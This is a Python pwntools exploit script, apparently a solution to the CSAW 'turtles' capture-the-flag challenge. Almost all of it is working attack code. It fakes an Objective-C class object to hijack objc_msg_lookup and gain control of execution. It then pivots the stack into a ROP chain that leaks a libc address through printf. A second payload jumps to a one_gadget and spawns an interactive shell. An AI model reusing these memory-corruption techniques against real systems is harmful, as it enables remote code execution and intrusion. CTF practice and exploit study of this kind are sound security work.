from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("pwn.chal.csaw.io" ,9003 )
    one_gadget = 0x41374
    printf_offset = 0x50cf0
else:
    p = process("./turtles", env={"LD_PRELOAD": os.path.join(os.getcwd(), "./libs/libgnustep-base.so.1.25")})
    one_gadget = 0x4526a
    printf_offset = 0x55800
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
               b *0x400c9b
               """)

               # b *0x400c32
               # b *0x400c3e
               
pop_4_ret = 0x400d3c
pop_3_ret = 0x400d3e
pop_2_ret = 0x400d40
pop_1_ret = 0x400d42
pop_rdi = 0x400d43
pop_rsi_r15 = 0x400d41
printf_got = 0x601290

turtle = int(p.recvline().strip().split(": ")[1], 16)
print "Turtle addr", hex(turtle)


'''
Stage 1, ROP chain for libc leak
'''

# restore heap data at addr 0x652610
payload = p64(turtle + 0x60) # evil turtle. Fake an OBJC_Turtle_class object at turtle+0x60
# payload = p64(0x00000000006014c0) # real turtle

# This ROP chain is called after we get RIP and stack pivot
payload += p64(pop_rdi)
payload += p64(turtle + 0x58) # ptr to printf fmt string
payload += p64(pop_rsi_r15)

payload += p64(printf_got+1) # rsi, printf arg
payload += p64(0x20) # garbage r15

payload += p64(0x400c39) # mov eax, 0; call printf

payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += "%s\n" + "\x00"*5 # printf fmt string

# addr turtle+0x60:
# fake isa pointer control over RDI in objc_msg_lookup leads to control over RAX at return, getting RIP at call rax
payload += p64(turtle+0x60) # 1. val set to RBX, later mov [rbx+0x40] to rdx
payload += p64(0) 
payload += p64(turtle+0xa8) # 3. rdx+8, if r8 < 0xff,  0x7ffff73faca4 <objc_msg_lookup+52>    mov    rax, qword ptr [rdx + 8]

payload += p64(0) 
payload += p64(0) 

payload += p64(0xff)*3
payload += p64(turtle+0x68) # 2. fake cache list at [rbx+0x40], stored into rdx

payload += p64(pop_4_ret) # 4. RAX call target. Setup stack pivot to stack rop chain in payload

print "payload len", len(payload)

p.sendline(payload)

libc_leak = p.recvline().strip()
libc_leak = u64(("\x00" + libc_leak).ljust(8, "\x00"))
print "libc_leak", hex(libc_leak)

libc_base = libc_leak - printf_offset
print "libc base", hex(libc_base)

'''
STAGE 2 EXPLOIT
create new payload that sets RAX to one_gadget, send again
'''

payload = p64(turtle+0x60) # fake turtle class ptr
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)

payload += p64(0x400C5C) # read() returns here, overwritten after we read 2nd payload onto stack, so we have to add back the expected retaddr

payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)

#addr turtle+0x60
# fake control over RDI and RSI for objc_msg_lookup 
payload += p64(turtle+0x60) # 1. val set to RBX, later mov [rbx+0x40] to rdx
payload += p64(0) # rsp+0x30, must be NULL for one_gadget
payload += p64(turtle+0xa8) # 3. rdx+8, if r8 < 0xff,  0x7ffff73faca4 <objc_msg_lookup+52>    mov    rax, qword ptr [rdx + 8]

payload += p64(0) 
payload += p64(0) 

payload += p64(0xff)*3
payload += p64(turtle+0x68) # 2. fake cache list at [rbx+0x40], stored into rdx

payload += p64(libc_base+one_gadget) # 4. RAX ->one_gadget. Profit!

print "payload len", len(payload)
p.sendline(payload)
p.interactive()
